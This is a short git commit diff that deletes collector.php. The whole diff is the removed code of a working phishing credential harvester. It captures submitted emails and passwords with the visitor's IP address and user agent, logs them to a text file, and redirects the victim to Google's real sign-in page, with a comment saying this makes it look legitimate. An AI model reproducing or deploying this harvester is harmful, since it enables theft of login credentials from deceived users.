2c46fc7cf5e717bd31808f2384c3ad236a9c7435
Huss873 <davidaltuniverse@gmail.com>
2025-04-16 10:36:34 -0300

    Update collector.php

--- collector.php
+++ collector.php
@@ -1,17 +1,1 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $email = $_POST["email"] ?? "N/A";
-    $senha = $_POST["senha"] ?? "N/A";
 
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $userAgent = $_SERVER['HTTP_USER_AGENT'];
-
-    $dados = "Email: $email | Senha: $senha | IP: $ip | User-Agent: $userAgent\n";
-
-    file_put_contents("logs.txt", $dados, FILE_APPEND);
-
-    // Redireciona para Google real (para parecer legítimo)
-    header("Location: https://accounts.google.com/");
-    exit();
-}
-?>
